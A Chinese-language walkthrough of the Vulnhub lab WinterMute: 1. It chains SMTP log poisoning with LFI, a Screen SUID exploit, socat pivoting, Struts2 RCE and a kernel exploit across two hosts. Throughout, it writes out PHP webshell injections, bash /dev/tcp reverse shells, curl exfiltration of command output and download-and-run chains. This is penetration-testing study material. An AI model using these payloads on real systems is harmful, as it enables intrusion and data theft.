---
description: 通过 SMTP 日志投毒结合 LFI 实现 PHP 代码执行，获取靶机 A 的初始 Shell，并利用 SUID 权限的 Screen 4.5.0 完成提权。随后利用靶机 A 的双网卡特性，通过 Socat 建立端口转发，访问内网靶机 B，利用 Struts2 RCE 获取 Shell，最终通过 Ubuntu 4.4.0-116 内核漏洞完成 Root 提权，实现双主机的完整渗透。
---

# WinterMute: 1

- 靶场名称：WinterMute: 1
- 靶场链接：https://www.vulnhub.com/entry/wintermute-1,239/
- 攻击目标：两台 Linux 主机
- 主要考点：
  - SMTP 日志投毒（Log Poisoning）
  - LFI（Local File Inclusion）
  - SUID 提权
  - 内网主机发现
  - Socat 端口转发
  - Struts2 远程命令执行
  - Linux 内核漏洞提权
- 工具清单：Nmap、smtp-user-enum、Gobuster、Burp Suite、Socat、SearchSploit、Netcat
- 来源：听课笔记 from Zumpyx_OSCP-Like Vulnhub Machines_系列

---

## 一、信息收集

### 1. 主机发现&端口探测

```shell
nmap -sn 192.168.56.1/24 --min-rate 10000
IP=192.168.56.102
nmap -A -T4 -oN nmap.txt $IP -p `nmap -p- -T5 $IP | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ','`
```

![image-20261117172813661](image-20261117172813661.png)

开放端口：

| 端口 | 服务 | 说明 |
|---|---|---|
| 25 | SMTP | 邮件服务 |
| 80 | HTTP | Web 服务 |
| 3000 | HTTP | Web 服务 |

### 2. SMTP 用户枚举

针对 25 端口的 SMTP 服务，可以使用 `smtp-user-enum` 进行用户枚举

```shell
smtp-user-enum -M RCPT -t 192.168.56.102 -u root
```

此处暂未获得有效突破，但需要注意 SMTP 服务可能产生的邮件日志，后续可以结合文件包含漏洞进一步分析

### 3. Web 目录扫描

对 80 端口进行目录扫描

```shell
dirb http://192.168.56.102/

gobuster dir \
-u http://192.168.56.102 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

扫描发现 `/freeside` 路径

## 二、Web 服务分析与初始 Shell

### 1. 3000 端口分析

访问 `http://192.168.56.102:3000`，发现登录页面

根据页面提示，使用默认凭据 `admin:admin` 成功登录

回看 Nmap 的服务探测结果，该服务被识别为 `Apache Hadoop`

进一步分析发现，该页面用于监控靶机不同网卡的网络流量

发现该靶机的一个 URI 的访问记录：

```text
turing-bolo
```

尝试通过 80 端口访问该资源：

```text
http://192.168.56.102/turing-bolo
```

页面可以正常访问

### 2. 分析可能存在的文件包含漏洞

观察页面请求，发现一个可疑参数：

```text
?bolo=molly
```

尝试对参数进行简单测试

**SQL 注入测试**

```text
?bolo=molly' and '1' = '1
```

未观察到预期结果

**目录穿越与文件读取测试**

```text
?bolo=../../../../etc/passwd
```

页面返回空白，没有获得预期文件内容

**路径 FUZZ**

使用 Burp Suite，结合 `/usr/share/seclists/Fuzzing` 下的字典进行多组测试，暂未发现有效路径

**PHP 伪协议**

```text
?bolo=php://filter/read=zlib.deflate/resource=bolo.php
```

同样没有得到有效结果

至此，暂时无法确定参数的具体利用方式

### 3. 结合 SMTP 服务寻找突破口

回顾当前已经发现的服务：

- 25：SMTP
- 80：HTTP
- 3000：HTTP

两个 Web 服务暂时没有取得有效突破，于是重新关注 SMTP 服务

结合之前发现的可疑参数 `bolo`，考虑利用文件包含读取 SMTP 邮件日志

依次尝试：

```text
?bolo=../../../../../../../../../../var/log/maillog

?bolo=../../../../../../../../../../var/log/mail
```

其中，包含 `/var/log/mail` 时，页面成功返回日志内容

![image-20261117184608630](image-20261117184608630.png)

这说明 `bolo` 参数存在本地文件包含（LFI）的利用可能

之前读取 `/etc/passwd` 未得到结果，可能是文件权限问题

也可能受到文件路径、应用程序处理逻辑等因素影响

### 4. SMTP 日志投毒

成功读取邮件日志后，需要进一步分析日志内容

注意到日志中出现了 `192.168.56.1`，这是攻击机的 IP，说明之前的 SMTP 用户枚举操作已经在日志中留下了记录

于是使用 Burp Suite 拦截包含日志的 HTTP 请求，观察响应内容及数据包大小

![image-20261117184932435](image-20261117184932435.png)

再次执行 SMTP 用户枚举：

```shell
smtp-user-enum -M RCPT -t 192.168.56.102 -u root
```

观察到 HTTP 响应大小发生变化

进一步将用户名替换为随机字符串：

```shell
smtp-user-enum -M RCPT -t 192.168.56.102 -u qqqqqqq
```

在响应内容中发现了对应的测试字符串

![image-20261117185145548](image-20261117185145548.png)

由此可以推测，SMTP 服务会将用户输入记录到邮件日志中，而日志文件又能够通过 Web 端的 LFI 进行读取

接下来尝试向日志中写入 PHP 代码：

```shell
smtp-user-enum -M RCPT -t 192.168.56.102 -u '<?php phpinfo();?>'
```

再次访问包含 `/var/log/mail` 的页面，发现 PHP 代码被成功解析

![image-20261117184210965](image-20261117184210965.png)

至此，完成 SMTP 日志投毒与 LFI 的组合利用，获得 PHP 代码执行能力

其利用链如下：

```text
SMTP 用户输入
    |
    v
SMTP 服务记录邮件日志
    |
    v
日志中写入 PHP 代码
    |
    v
Web 参数 bolo 包含邮件日志
    |
    v
PHP 解析日志中的代码
    |
    v
PHP 代码执行
```

### 5. 利用 PHP 代码执行获取 Shell

将 `phpinfo()` 替换为 `system()`，构造命令执行入口：

```shell
smtp-user-enum -M RCPT -t 192.168.56.102 \
-u '<?php system($_POST[0]); phpinfo();?>'
```

> 注意：在 Linux Shell 中，`$` 会被识别为变量展开符，因此需要使用单引号保护 PHP 代码，避免 `$ _POST` 中的变量被 Shell 提前解析

首先在攻击机启动 Netcat 监听：

```shell
nc -lvnp 2233
```

尝试使用 Bash 反弹 Shell：

```text
0=sh -i >& /dev/tcp/192.168.56.1/2233 0>&1
```

> 请求时需要进行 URL 编码

未能成功建立反弹连接，可惜

此时不能直接判断靶机禁止网络通信，需要区分命令执行、出站连接及反弹 Shell 本身的执行条件

### 6. 验证命令执行与信息外带

为了确认相关网络通信命令是否能够正常执行，在攻击机启动临时 HTTP 服务：

```shell
python -m http.server --bind 0.0.0.0 80
```

通过 PHP 命令执行入口访问攻击机：

```text
0=curl http://192.168.56.1/
```

成功在攻击机 HTTP 服务中观察到请求，说明靶机可以主动访问攻击机

![image-20261117185457127](image-20261117185457127.png)

进一步利用命令替换，将命令执行结果作为 URL 路径：

```shell
0=curl http://192.168.56.1/`whoami`
```

攻击机 HTTP 服务成功收到携带用户名的请求

![image-20261117185549069](image-20261117185549069.png)

说明不仅能够执行系统命令，还可以通过 HTTP 请求外带命令执行结果

### 7. 获取反弹 Shell

在 curl 的基础上尝试通过 Bash 建立反弹连接，但未成功

随后通过 HTTP 信息外带检查 Python 环境，尝试 python 相关反弹 Shell

```shell
0=curl http://192.168.56.1/`which python`
```

发现靶机存在：

```text
/usr/bin/python
```

因此改用 Python 建立反弹 Shell，最终成功获得靶机 A 的 Shell

![image-20261117185950545](image-20261117185950545.png)

![image-20261117185717717](image-20261117185717717.png)

### 8. Shell 基础优化

设置终端类型：

```shell
export TERM=xterm
```

此操作可以改善部分终端显示效果，但并不等同于完整的 TTY 升级

## 三、靶机 A 权限提升

获得普通用户 Shell 后，开始进行常规提权信息收集

### 1. 常规信息收集

依次检查：

```shell
# sudo 权限
sudo -l

# 定时任务
cat /etc/crontab

# 关键文件权限
ls -la /etc/passwd /etc/shadow

# 查看本地用户
cat /etc/passwd | grep home

# 查看用户家目录
cd /home
ls -lRa   # -R 递归读取

# 查看进程
ps -ef
```

上述检查暂未发现有效提权入口

### 2. 查找 SUID 文件

使用以下命令查找具有 SUID 权限的文件：

```shell
find / -perm -u=s -type f 2>/dev/null
```

发现：

```text
/bin/screen-4.5.0
```

查看版本信息：

```shell
/bin/screen-4.5.0 -v
```

确认其版本为 Screen 4.5.0

### 3. 利用 Screen 4.5.0 提权

使用 SearchSploit 搜索相关漏洞：

```shell
searchsploit screen
```

发现本地权限提升漏洞：

```text
Linux Local Privilege Escalation        linux/local/41154.sh
```

导出漏洞利用脚本：

```shell
searchsploit screen -m 41154
```

将脚本传输到靶机执行

**攻击机：**

```shell
python -m http.server --bind 0.0.0.0 80
```

**靶机 A：**

```shell
cd /tmp

wget http://192.168.56.1/41154.sh

chmod +x 41154.sh

./41154.sh
```

成功获得 Root 权限

![image-20261118111959384](image-20261118111959384.png)

至此，完成靶机 A 的权限提升

## 四、内网信息收集与横向移动

### 1. 检查 Root 家目录

进入 Root 家目录：

```shell
cd /root
```

发现以下文件：

- `flag.txt`：内容疑似加密信息（其实就是个 flag 凭据）
- `note.txt`：包含后续渗透的重要提示，`struts2_2.3.15.1-showcase`
- 其他关键文件及其绝对路径

结合后续发现的内网主机及 Struts2 服务，可以确定这些信息是为进一步渗透提供线索

### 2. 查看网络接口

执行：

```shell
ip a
```

![1794972867069](1794972867069.png)

发现靶机 A 存在连接不同网络的网卡，说明其可能同时处于攻击机所在网络和内部网络中

这为后续通过靶机 A 访问内网主机提供了条件

### 3. 内网主机发现

对内网网段进行存活探测：

```shell
for i in {1..255}; do
    ping -c 1 10.10.10.$i
done
```

发现内网主机：

```text
10.10.10.6
```

将其记为靶机 B

![image-20261118163742343](image-20261118163742343.png)

### 4. 内网端口扫描

由于攻击机无法直接访问内网网段，因此在已经获得 Root 权限的靶机 A 上进行端口扫描：

```shell
nc -v -z -w2 10.10.10.6 1-65535
```

发现三个开放端口：

```text
34483
8080
8009
```

![image-20261118165216595](image-20261118165216595.png)

### 5. 使用 Socat 建立端口转发

检查靶机 A 是否安装 Socat：

```shell
which socat
```

发现 Socat 存在

由于攻击机无法直接访问 `10.10.10.6`，可以在靶机 A 上建立 TCP 端口转发，将靶机 A 的监听端口转发到靶机 B 对应端口

执行：

```shell
socat TCP-LISTEN:8009,fork TCP:10.10.10.6:8009 &

socat TCP-LISTEN:8080,fork TCP:10.10.10.6:8080 &

socat TCP-LISTEN:34483,fork TCP:10.10.10.6:34483 &
```

> 参数说明：
> 
> - `TCP-LISTEN`：在本机创建 TCP 监听端口
> - `fork`：每接受一个连接便创建子进程处理，允许多个连接
> - `TCP`：将连接转发到指定目标地址及端口
> - `&`：将进程放入后台运行

此时建立的转发关系：

```text
攻击机，192.168.56.1
    |
    | 访问靶机 A 的开放端口，如8009
    v
靶机 A，192.168.56.102:8009
    |
    | socat 端口转发
    v
靶机 B，10.10.10.6:8009
```

> 检查监听状态：
> 
> ```shell
> netstat -lntp
> ```
> 
> ![image-20261118171709157](image-20261118171709157.png)
> 
> ![image-20261118165623372](image-20261118165623372.png)

### 6. 通过端口转发探测内网服务

端口转发建立后，攻击机可以直接访问靶机 A 的对应端口，实际连接会由 Socat 转发至靶机 B

因此，可以在攻击机上对转发后的端口进行**服务探测**：

```shell
nmap -sVC -p 8009,8080,34483 192.168.56.102 -Pn
```

![image-20261118170205928](image-20261118170205928.png)

之后访问：

```text
http://192.168.56.102:8080
```

实际上访问的是靶机 B 的 8080 端口服务

## 五、利用 Struts2 漏洞获取靶机 B 的 Shell

### 1. 分析 8080 端口 Web 服务

首先尝试访问 8009 端口，未获得有效结果

随后访问 8080 端口：

```text
http://192.168.56.102:8080
```

结合此前在靶机 A 的 `/root/note.txt` 中发现的 URI，尝试访问：

```text
http://192.168.56.102:8080/struts2_2.3.15.1-showcase
```

页面发生重定向，最终访问：

```text
http://192.168.56.102:8080/struts2_2.3.15.1-showcase/showcase_action
```

发现这是一个 Struts2 Showcase 应用

页面中存在文件上传功能

### 2. 尝试文件上传

尝试上传一个名为 `shell.txt` 的文件，并通过 Burp Suite 拦截请求，将文件名修改为：

```text
shell.jsp
```

拦截响应包并查看上传文件后的位置

但发现服务端对上传文件的后缀进行了修改，未能直接获得可解析的 JSP WebShell 后缀

![image-20261118170544452](image-20261118170544452.png)

文件上传路线暂时无法继续，于是重新分析 Struts2 应用本身

### 3. 搜索 Struts2 漏洞

结合页面暴露的版本信息，使用 SearchSploit 搜索：

```shell
searchsploit struts 2.3
```

发现可利用脚本：

```text
42324.py
```

导出脚本：

```shell
searchsploit -m 42324
```

该脚本用于利用对应 Struts2 漏洞实现远程命令执行

形式如下：
```shell
python 42324.py \
http://10.10.10.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action \
"cmd"
```

### 4. 配置反弹 Shell 网络通道

由于靶机 B 位于内网，无法直接向攻击机所在网络建立反弹连接，因此需要借助靶机 A 再建立两条端口转发通道

**第一条：反弹 Shell 通道**

在靶机 A 上执行：

```shell
socat TCP-LISTEN:2234,fork TCP:192.168.56.1:2234 &
```

这样，靶机 B 连接靶机 A 的 `10.10.10.5:2234` 时，连接会被转发到攻击机的 `192.168.56.1:2234`

在攻击机启动监听：

```shell
nc -lvnp 2234
```

**第二条：文件传输通道**

在靶机 A 上执行：

```shell
socat TCP-LISTEN:88,fork TCP:192.168.56.1:80 &
```

在攻击机启动 HTTP 服务：

```shell
python -m http.server --bind 0.0.0.0 80
```

此时靶机 B 可以通过：

```text
http://10.10.10.5:88/
```

访问攻击机提供的 HTTP 服务

两条通道的关系：

```text
靶机 B，10.10.10.6
    |
    | 反弹 Shell：2234
    | 文件下载：88
    v
靶机 A，10.10.10.5
    |
    | socat 转发
    v
攻击机，192.168.56.1
    |
    +---- 2234：Netcat 监听
    |
    +---- 80：Python HTTP 服务
```

### 5. 准备反弹 Shell 脚本

在攻击机 HTTP 服务目录下准备 `reverse.sh`：

```bash
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.5/2234 0>&1'
```

> 注意：这里的反弹目标是靶机 A 的内网 IP `10.10.10.5`，而不是攻击机的 `192.168.56.1`，因为已经在靶机 A 上配置了对应的 Socat 转发

### 6. 利用 Struts2 RCE 执行命令

通过 `42324.py` 对 Struts2 Showcase 应用进行命令执行

首先下载反弹 Shell 脚本：

```shell
python 42324.py \
http://10.10.10.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action \
"wget http://10.10.10.5:88/reverse.sh -O /tmp/2.sh"
```

赋予执行权限：

```shell
python 42324.py \
http://10.10.10.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action \
"chmod +x /tmp/2.sh"
```

执行反弹 Shell：

```shell
python 42324.py \
http://10.10.10.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action \
"sh /tmp/2.sh"
```

![image-20261118173947946](image-20261118173947946.png)

攻击机成功接收到反弹连接，获得靶机 B 的 Shell

![image-20261118172547152](image-20261118172547152.png)

> ### 命令执行结果外带补充
> 
> 除了通过反弹 Shell 获取交互式终端，也可以通过 HTTP 请求外带命令执行结果
> 
> 例如：
> 
> ```shell
> python 42324.py \
> http://10.10.10.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action \
> "curl http://10.10.10.5:88/`whoami`"
> ```
> 
> 可以在攻击机 HTTP 服务日志中观察到请求路径中的用户名
> 
> 曾尝试对命令进行 URL 编码：
> 
> ```shell
> python 42324.py \
> http://10.10.10.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action \
> "curl http://10.10.10.5:88/%60whoami%60"
> ```
> 
> 但编码后未能达到预期效果
> 
> 最终仍采用脚本下载与 Netcat 反弹 Shell 的方式获得交互式终端

## 六、靶机 B 权限提升

### 1. Shell 交互优化

执行 `sudo -l` 时出现报错：

```text
no tty present and no askpass program specified
```

说明当前 Shell 缺少可用的 TTY，部分需要交互终端的命令无法正常执行

检查 Python 环境：

```shell
which python
which python3
```

发现存在 Python3，使用 PTY 模块生成伪终端：

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

随后再次执行：

```shell
sudo -l
```

成功进入 sudo 权限检查流程，但需要输入密码，暂时无法利用

### 2. 检查内核版本

查看系统内核信息：

```shell
uname -a
```

发现内核版本：

```text
Ubuntu 4.4.0-116
```

针对该版本进行漏洞搜索：

```shell
searchsploit Ubuntu 4.4.0
```

发现适用于该内核版本的本地权限提升漏洞利用脚本：

```text
44298.c
```

导出漏洞利用代码：

```shell
searchsploit -m 44298.c
```

### 3. 编译并传输 Exploit

检查靶机 B 是否存在 GCC：

```shell
which gcc
which cc
```

未发现可用编译工具，因此选择在攻击机上进行静态编译，再将编译后的 ELF 文件传输至靶机 B

**攻击机：**

```shell
gcc -static 44298.c -o 1.elf

python -m http.server --bind 0.0.0.0 80
```

**靶机 B：**

利用此前配置的靶机 A 端口转发，通过 `10.10.10.5:88` 下载文件：

```shell
cd /tmp

wget http://10.10.10.5:88/1.elf

chmod +x 1.elf

./1.elf
```

成功获得靶机 B 的 Root 权限

![image-20261118182248393](image-20261118182248393.png)

至此，两台靶机均完成权限提升

---

## 七、总结与反思

### 1. 完整攻击链

```text
攻击机，192.168.56.1
    |
    v
靶机 A：192.168.56.102
    |
    | SMTP 日志投毒
    | LFI
    v
PHP 代码执行
    |
    v
获取普通用户 Shell
    |
    | SUID Screen 4.5.0
    v
靶机 A Root
    |
    | 发现第二块网卡
    | 内网主机探测
    v
靶机 B：10.10.10.6
    |
    | Socat 端口转发
    v
Struts2 RCE
    |
    v
获取靶机 B 普通用户 Shell
    |
    | Ubuntu 4.4.0-116 内核漏洞
    v
靶机 B Root
```

### 2. 关键技术点

| 技术 | 本次利用中的作用 |
|---|---|
| SMTP Log Poisoning | 将 PHP 代码写入邮件日志 |
| LFI | 包含邮件日志，使其中的 PHP 代码得到解析 |
| PHP RCE | 执行系统命令并获取初始 Shell |
| SUID | 发现具有特殊权限的 Screen 程序 |
| Screen 4.5.0 | 利用本地权限提升漏洞获得 Root |
| Socat | 建立靶机 A 与内网靶机 B 之间的 TCP 端口转发 |
| Struts2 RCE | 利用 Web 框架漏洞执行远程命令 |
| Kernel Exploit | 利用 Ubuntu 内核漏洞完成第二台主机提权 |

### 3. 经验总结

- 信息收集不能只关注 Web 服务，SMTP 等基础服务同样可能成为突破口
- 文件包含漏洞不只是读取 `/etc/passwd`，还可以结合日志文件实现 Log Poisoning
- 命令执行不等于一定能够获得反弹 Shell，可以先通过 HTTP 请求等方式验证命令执行能力和网络连通性
- 内网渗透中，双网卡主机可以作为访问内网资产的跳板
- Socat 可以将内网服务映射到跳板机的监听端口，使攻击机能够进一步进行服务探测和漏洞利用
- 获取普通用户 Shell 后，应继续检查 SUID、sudo 权限、定时任务和内核版本等提权入口